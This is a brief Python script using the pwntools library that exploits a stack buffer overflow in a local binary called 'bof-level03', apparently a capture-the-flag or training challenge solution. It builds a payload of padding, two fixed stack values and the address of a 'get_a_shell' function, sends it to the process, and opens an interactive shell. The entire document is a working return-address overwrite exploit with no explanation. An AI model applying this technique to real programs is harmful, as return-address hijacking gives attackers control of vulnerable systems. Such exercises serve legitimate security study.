from pwn import *

elf = ELF("./bof-level03")
get_shell_addr = p64(elf.symbols["get_a_shell"])

a = 0x6867666564636261
b = 0x4847464544434241

buf_len = 0x30 - 0x10

message = buf_len * b"A" + p64(b) + p64(a)  + b"A" * 8 + get_shell_addr

p = process("./bof-level03")
p.sendline(message)
p.interactive()

